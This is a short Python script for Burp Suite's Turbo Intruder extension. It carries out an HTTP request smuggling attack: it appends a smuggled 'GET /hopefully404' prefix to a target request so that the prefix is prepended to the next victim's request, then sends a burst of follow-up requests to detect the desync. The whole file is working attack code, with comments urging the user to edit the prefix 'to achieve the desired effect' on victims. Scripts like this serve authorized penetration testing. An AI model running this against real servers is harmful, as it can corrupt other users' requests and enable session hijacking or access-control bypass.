def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1, # if you increase this from 1, you may get false positives
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /hopefully404 HTTP/1.1
X-Ignore: X'''

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')

    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    engine.queue(attack)

    victim = target.req
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)

